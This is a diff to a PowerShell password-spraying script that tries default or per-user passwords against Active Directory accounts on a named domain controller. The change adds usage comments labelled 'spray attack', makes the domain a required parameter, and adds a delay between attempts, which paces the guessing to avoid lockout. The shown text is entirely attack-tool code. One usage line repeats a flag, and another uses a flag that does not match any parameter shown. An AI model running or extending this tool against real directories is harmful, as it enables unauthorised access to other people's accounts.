@@ -1,3 +1,8 @@
+### HOW TO USE IT
+### spray attack via default password
+# .\aduser.ps1 -UserFile .\users.txt -PasswordFile .\default.txt -DC dc01.contoso.local -Domain CONTOSO -default -DelaySeconds 0.5 -default
+### spray attack via user own default password
+# .\aduser.ps1 -UserFile .\users.txt -PasswordFile .\default.txt -DC dc01.contoso.local -Domain CONTOSO -default -DelaySeconds 0.5 -personal
 param(
     [Parameter(Mandatory=$true)]
     [string]$UserFile,
@@ -8,7 +13,11 @@ param(
     [Parameter(Mandatory=$true)]
     [string]$DC,
 
-    [string]$Domain = "CONTOSO",
+    [Parameter(Mandatory=$true)]
+    [string]$Domain,
+
+    [ValidateRange(0, 3600)]
+    [double]$DelaySeconds = 0,
 
     [Alias("default")]
     [switch]$SharedDefault,
@@ -35,6 +44,10 @@ $passwords = @(Get-Content $PasswordFile | ForEach-Object { $_.TrimEnd("`r") })
 
 if ($SharedDefault -and $PerUser) {
     Stop-Script "-SharedDefault and -PerUser cannot be used together."
+}
+
+if (($DelaySeconds * 10) % 1 -ne 0) {
+    Stop-Script "DelaySeconds must be specified in 0.1 second increments."
 }
 
 $mode = if ($SharedDefault) { "SharedDefault" } else { "PerUser" }
@@ -89,6 +102,10 @@ $results = for ($i = 0; $i -lt $users.Count; $i++) {
     }
     finally {
         $conn.Dispose()
+    }
+
+    if ($DelaySeconds -gt 0 -and $i -lt ($users.Count - 1)) {
+        Start-Sleep -Milliseconds ([int]($DelaySeconds * 1000))
     }
 }
 
